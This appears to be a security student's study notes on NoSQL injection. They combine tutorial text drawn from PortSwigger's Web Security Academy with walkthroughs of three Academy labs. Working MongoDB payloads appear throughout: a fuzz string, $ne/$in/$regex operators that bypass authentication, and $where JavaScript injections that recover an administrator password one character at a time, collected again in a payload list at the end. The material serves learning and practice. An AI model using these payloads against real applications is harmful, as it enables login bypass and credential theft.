# NoSQL injection


<details>
  <summary>NoSqli</summary>

NoSQL injection
===============

NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. NoSQL injection may enable an attacker to:

-   Bypass authentication or protection mechanisms.
-   Extract or edit data.
-   Cause a denial of service.
-   Execute code on the server.

NoSQL databases store and retrieve data in a format other than traditional SQL relational tables. They use a wide range of query languages instead of a universal standard like SQL, and have fewer relational constraints.

![image](https://portswigger.net/web-security/nosql-injection/images/nosql-injection-graphic.svg)


Types of NoSQL injection
------------------------

There are two different types of NoSQL injection:

-   **`Syntax injection`** - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
-   **`Operator injection`** - This occurs when you can use NoSQL query operators to manipulate queries.

In this topic, we'll look at how to test for NoSQL vulnerabilities in general, then focus on exploiting vulnerabilities in MongoDB, which is the most popular NoSQL database. We've also provided some labs so you can practice what you've learned.


### Detecting syntax injection in MongoDB

Consider a shopping application that displays products in different categories. When the user selects the **Fizzy drinks** category, their browser requests the following URL:

`https://insecure-website.com/product/lookup?category=fizzy`

This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:

`this.category == 'fizzy'`

To test whether the input may be vulnerable, submit a fuzz string in the value of the `category` parameter. An example string for MongoDB is:

```
'"`{
;$Foo}
$Foo \xYZ
```

Use this fuzz string to construct the following attack:

`https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`

If this causes a change from the original response, this may indicate that user input isn't filtered or sanitized correctly.



NoSQL operator injection
------------------------

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:

-   `$where` - Matches documents that satisfy a JavaScript expression.
-   `$ne` - Matches all values that are not equal to a specified value.
-   `$in` - Matches all of the values specified in an array.
-   `$regex` - Selects documents where values match a specified regular expression.

You may be able to inject query operators to manipulate NoSQL queries. To do this, systematically submit different operators into a range of user inputs, then review the responses for error messages or other changes.

### Submitting query operators

In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.

For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:

1.  Convert the request method from `GET` to `POST`.
2.  Change the `Content-Type` header to `application/json`.
3.  Add JSON to the message body.
4.  Inject query operators in the JSON.




### Detecting operator injection in MongoDB

Consider a vulnerable application that accepts a username and password in the body of a `POST` request:

`{"username":"wiener","password":"peter"}`

Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection:

`{"username":{"$ne":"invalid"},"password":"peter"}`

If the `$ne` operator is applied, this queries all users where the username is not equal to `invalid`.

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:

`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection.

To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:

`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`



Exploiting syntax injection to extract data
-------------------------------------------

In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.

### Exfiltrating data in MongoDB

Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:

`https://insecure-website.com/user/lookup?username=admin`

This results in the following NoSQL query of the `users` collection:

`{"$where":"this.username == 'admin'"}`

As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:

`admin' && this.password[0] == 'a' || 'a'=='b`

This returns the first character of the user's password string, enabling you to extract the password character by character.

You could also use the JavaScript `match()` function to extract information. For example, the following payload enables you to identify whether the password contains digits:

`admin' && this.password.match(/\d/) || 'a'=='b`



























  
</details>








---
---

# **`Labs`**

<details>
  <summary>Lab: Detecting NoSQL injection</summary>

1. select any catiegory

```url
https://0af100fa046cc3e283420fe7002b0059.web-security-academy.net/filter?category=Pets
```


<img width="1657" height="877" alt="image" src="https://github.com/user-attachments/assets/34721e9d-6fad-49de-b037-f951e844b120" />

2. try to break the syntax

```
https://0af100fa046cc3e283420fe7002b0059.web-security-academy.net/filter?category=Pets'
```

<img width="1514" height="479" alt="image" src="https://github.com/user-attachments/assets/fa2a0f56-3e5b-4923-b73e-d8a9ffb1ebff" />


3. show unreleased products

```
https://0af100fa046cc3e283420fe7002b0059.web-security-academy.net/filter?category=Pets'||1||'
```

<img width="1585" height="861" alt="image" src="https://github.com/user-attachments/assets/31142bf0-0ab5-4c14-a6fd-f4712e934ab4" />



  
</details>



<details>
  <summary>Lab: Exploiting NoSQL operator injection to bypass authentication</summary>


1. try to inject in username feild

<img width="1495" height="512" alt="image" src="https://github.com/user-attachments/assets/70d67729-c870-48ae-bd61-110e8a8efeca" />

```json
"username":{"$ne":""},
"password":"peter"}
```

2. see if also the password is vuln

<img width="1451" height="535" alt="image" src="https://github.com/user-attachments/assets/02657c16-73e1-43f8-a285-4ccc78d85c7a" />

```json
{
  "username":{"$ne":""},
  "password":{"$ne":""}
}
```

3. now try to login with account that start with **`admin`**

<img width="1420" height="567" alt="image" src="https://github.com/user-attachments/assets/45966e56-20c8-4226-b497-d1f7034686f0" />

```json
{
  "username":{"$regex":"admin.*"},
  "password":{"$ne":""}
}
```


<img width="1284" height="643" alt="image" src="https://github.com/user-attachments/assets/7816e4bf-9570-4247-b314-6ef68e4f4a5d" />


  
</details>





<details>
  <summary>Lab: Exploiting NoSQL injection to extract data</summary>

1. first in my profile notice the role **`user want to see the sourse code`**


```js
const appendFromUser = (user) => {
    const email = user.email;
    if (email) {
        document.querySelector("#user-details #user-email").textContent = email;
    }

    const role = user.role;
    if (role) {
        document.querySelector("#user-details #username").textContent += ` (role: ${role})`;
    }
};

const appendUserDetails = () => {
    const url = new URL(location);

    fetch(`//${url.host}/user/lookup?user=${encodeURIComponent(url.searchParams.get('id'))}`)
        .then(res => res.json())
        .then(appendFromUser);
};

appendUserDetails();

```

2. so this endpoint i can check the role of user

```
/user/lookup?user=
```

<img width="1007" height="298" alt="image" src="https://github.com/user-attachments/assets/c384836c-84b0-4399-9899-77012949f3e3" />

<img width="1027" height="326" alt="image" src="https://github.com/user-attachments/assets/65bbed68-7ae1-40c6-b006-10df06df5bb4" />

3. Query that server send is :

```js
{ "$where": "this.username == 'admin'" }
```

 > test for **`nosql`**

<img width="1356" height="361" alt="image" src="https://github.com/user-attachments/assets/3e619d7f-eeb7-47c3-aa0b-001608a3ae03" />



4. we can inject it with

```js
administrator' && this.password[0] == 'a' || 'a'=='b
```

> **`the query after inject`**

```js
this.username == 'administrator' && this.password[0] == 'a' || 'a'=='b'
```

## > first lets get password length

```js
administrator' && this.password.length == 8 || 'x'=='y
```

<img width="1382" height="703" alt="image" src="https://github.com/user-attachments/assets/68b8d8ff-2f4a-40c7-98c1-d93c3d2dba78" />



> 2. found if there is digit in it

```js
administrator' && this.password.match(/\d/) || 'a'=='b
```

<img width="1308" height="364" alt="image" src="https://github.com/user-attachments/assets/f3d9e6bb-9fe5-451d-b771-85ae56232695" />


> 3. now brute force

<img width="1622" height="598" alt="image" src="https://github.com/user-attachments/assets/586edd18-a6a6-4772-9ff5-8cf742b7714a" />

```
/user/lookup?user=administrator'+%26%26+this.password[0]+%3d%3d+'u'+||+'a'%3d%3d'b
```

### **`password`**

```
ugemsykg
```


<img width="1312" height="652" alt="image" src="https://github.com/user-attachments/assets/fa31a2f5-6157-473b-853f-2c9f1b1f925b" />

  
</details>


























```json
administrator' && '1'=='1
administrator' && '1'=='2
```


```json
administrator' && this.password.length == 1 || 'a'=='b
```

```json
administrator' && this.password.match(/\d/) || 'a'=='b
administrator' && this.password.match(/[A-Z]/) || 'a'=='b
administrator' && this.password.match(/[a-z]/) || 'a'=='b
```



```json
administrator' && this.password[0] == 'a' || 'a'=='b
```

```json
administrator' && /^a.*/.test(this.password) || 'a'=='b
administrator' && /^ab.*/.test(this.password) || 'a'=='b

```



